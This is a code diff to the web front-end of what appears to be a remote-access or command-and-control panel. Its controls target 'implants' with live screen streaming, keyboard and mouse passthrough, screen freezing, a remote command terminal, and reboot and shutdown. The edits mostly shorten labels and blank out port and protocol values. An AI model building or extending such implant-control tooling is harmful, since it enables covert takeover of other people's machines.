@@ -544,7 +544,7 @@
             }
             // Update button text/icon
             const btn = document.getElementById('btn-toggle-stream');
-            if(btn) btn.innerHTML = isStreaming ? '<i class="ph ph-stop-circle" style="margin-right:6px"></i> Stop Stream' : '<i class="ph ph-play" style="margin-right:6px"></i> Start Stream';
+            if(btn) btn.innerHTML = isStreaming ? '<i class="ph ph-stop-circle" style="margin-right:6px"></i>' : '<i class="ph ph-play" style="margin-right:6px"></i>';
         }
         
         // Sends terminal command
@@ -890,8 +890,8 @@
                         <div class="stat-row"><div class="stat-lbl"><i class="fa-solid fa-earth-americas" style="margin-right:8px; width:14px; text-align:center;"></i>Countries</div><div class="stat-val" id="stat-countries">0</div></div>
                         <div class="stat-row"><div class="stat-lbl"><i class="fa-regular fa-clock" style="margin-right:8px; width:14px; text-align:center;"></i>Avg Uptime</div><div class="stat-val dim" id="stat-uptime">—</div></div>
                         <div class="divider"></div>
-                        <div class="stat-row"><div class="stat-lbl"><i class="fa-solid fa-network-wired" style="margin-right:8px; width:14px; text-align:center;"></i>Port</div><div class="stat-val dim">9999</div></div>
-                        <div class="stat-row"><div class="stat-lbl"><i class="fa-solid fa-shield-halved" style="margin-right:8px; width:14px; text-align:center;"></i>Proto</div><div class="stat-val dim">TCP</div></div>
+                        <div class="stat-row"><div class="stat-lbl"><i class="fa-solid fa-network-wired" style="margin-right:8px; width:14px; text-align:center;"></i>Port</div><div class="stat-val dim">null</div></div>
+                        <div class="stat-row"><div class="stat-lbl"><i class="fa-solid fa-shield-halved" style="margin-right:8px; width:14px; text-align:center;"></i>Proto</div><div class="stat-val dim">null</div></div>
                     </div>
                 </div>
                 <div class="sub-panel" style="flex:1;overflow:hidden;display:flex;flex-direction:column;gap:10px;margin-left:6px;padding:20px;">
@@ -1058,25 +1058,19 @@
             control: {
                 title: 'Control Panel',
                 grid: [
-                    {header:'Target & System Overview', span:'fill', controls:[
+                    {header:'Config', span:'fill', controls:[
                         { ui:'dropdown',label:'Target Implant',type:'single',options: ["None"],flag:'ImplantTarget'},
-                        { ui:'button', label:'Refresh System Info', type:'single', text:'Refresh', action:'sys_info'},
-                        { ui:'html', content: `
-                            <div class="stat-row" style="margin-top:10px;"><div class="stat-lbl"><i class="ph ph-desktop" style="margin-right:8px; width:14px; text-align:center;"></i>System Info</div><div class="stat-val dim" id="sys-info-content" style="white-space: pre-wrap; text-align:right;">—</div></div>
-                        `}
                     ]},
-                    {header:'Remote View', span:'fill', controls:[
+                    {header:'Cast', span:'fill', controls:[
                         { ui:'html', content: `
                             <div class="wv-toolbar">
                                 <span class="wv-toolbar-title">Options</span>
                                 <div class="wv-sep"></div>
-                                <button id="btn-toggle-stream" class="tool-btn button" style="width:auto; min-width:100px; padding: 7px 12px;" onclick="toggleStream()"><i class="ph ph-play" style="margin-right:6px"></i> Start Stream</button>
+                                <button id="btn-toggle-stream" class="tool-btn button" style="width:auto; min-width:100px; padding: 7px 12px;" onclick="toggleStream()"><i class="ph ph-play" style="margin-right:6px"></i></button>
                                 <div class="tool-btn" onclick="sendImplantCmd('key_passthrough_on')"><i class="ph ph-keyboard"></i><span class="tip">Enable Keyboard Passthrough</span></div>
-                                <div class="tool-btn" onclick="sendImplantCmd('key_passthrough_off')"><i class="ph ph-keyboard-off"></i><span class="tip">Disable Keyboard Passthrough</span></div>
                                 <div class="tool-btn" onclick="sendImplantCmd('mouse_passthrough_on')"><i class="ph ph-mouse"></i><span class="tip">Enable Mouse Passthrough</span></div>
-                                <div class="tool-btn" onclick="sendImplantCmd('mouse_passthrough_off')"><i class="ph ph-mouse-simple-off"></i><span class="tip">Disable Mouse Passthrough</span></div>
-                                <div class="tool-btn" onclick="sendImplantCmd('screen_freeze')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze Screen (Win)</span></div>
-                                <div class="tool-btn" onclick="sendImplantCmd('screen_unfreeze')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw Screen (Win)</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('screen_freeze')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze Screen</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('screen_unfreeze')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw Screen</span></div>
                                 <div class="wv-sep"></div>
                             </div>
                             <div style="width:100%; aspect-ratio:16/9; background:#000; border-radius:8px; border:1px solid var(--secondary); display:flex; align-items:center; justify-content:center; overflow:hidden; position:relative; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
@@ -1085,7 +1079,7 @@
                             </div>
                         `}
                     ]},
-                    {header:'Terminal Access', span:'fill', controls:[
+                    {header:'Terminal', span:'fill', controls:[
                         { ui:'html', content: `
                             <textarea id="term-out" readonly style="width:100%; height:250px; background:var(--input-bg); color:var(--accent); font-family:monospace; font-size:11px; padding:12px; border:1px solid var(--secondary); border-radius:4px; margin-bottom:8px; resize:vertical; outline:none;"></textarea>
                             <input id="term-in" type="text" placeholder="Enter remote command..." onkeydown="if(event.key==='Enter') sendTerm()" style="width:100%; background:var(--input-bg); color:var(--text-color); font-family:monospace; font-size:11px; padding:10px 12px; border:1px solid var(--secondary); border-radius:4px; outline:none;" />
@@ -1141,7 +1135,7 @@
                             </div>
                         `}
                     ]},
-                    {header:'System Utilities', span:'fill', controls:[
+                    {header:'System', span:'fill', controls:[
                         { ui:'button', label:'System Reboot', type:'double', text:'Reboot', secondarytext:'Confirm Reboot?', action:'sys_reboot'},
                         { ui:'button', label:'System Shutdown', type:'double', text:'Shutdown', secondarytext:'Confirm Shutdown?', action:'sys_shutdown'},
                     ]},
@@ -1345,13 +1339,12 @@
             closeAllPopovers(); 
 
             if(flag === 'ImplantTarget') {
-                // When implant target changes, reset UI elements and fetch new data
                 setTimeout(() => {
                     sendImplantCmd('sys_info');
                     sendImplantCmd('screen_stop');
                     isStreaming = false;
                     const btnStream = document.getElementById('btn-toggle-stream');
-                    if (btnStream) btnStream.innerHTML = '<i class="ph ph-play" style="margin-right:6px"></i> Start Stream';
+                    if (btnStream) btnStream.innerHTML = '<i class="ph ph-play" style="margin-right:6px"></i>';
                     const lsImg = document.getElementById('live-screen-img');
                     if (lsImg) lsImg.style.display = 'none';
                     const lsIco = document.getElementById('live-screen-icon');
